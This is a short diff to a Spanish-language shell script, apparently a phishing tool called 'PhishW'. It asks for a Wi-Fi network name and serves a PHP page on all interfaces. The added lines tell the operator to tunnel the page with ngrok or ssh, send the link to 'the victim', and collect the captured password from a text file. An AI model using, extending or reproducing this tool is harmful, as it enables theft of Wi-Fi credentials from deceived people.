@@ -49,9 +49,10 @@ pkg install figlet
 fi
 
 clear
-setterm -foreground blue
+setterm -foreground red
 figlet PhishW
 echo ""
+setterm -foreground blue
 echo -n "[+]Introduce el nombre de la red wifi >> "
 read a
 echo "
@@ -111,6 +112,8 @@ setterm -foreground cyan
 echo ""
 echo "localhost:$b abierto "
 echo "Haga un tunel con ngrok o ssh"
+echo "Enviale el link del túnel a la victima"
+echo "La Contraseña se guarda en el archivo txt"
 echo ""
 php -S 0.0.0.0:$b
 #
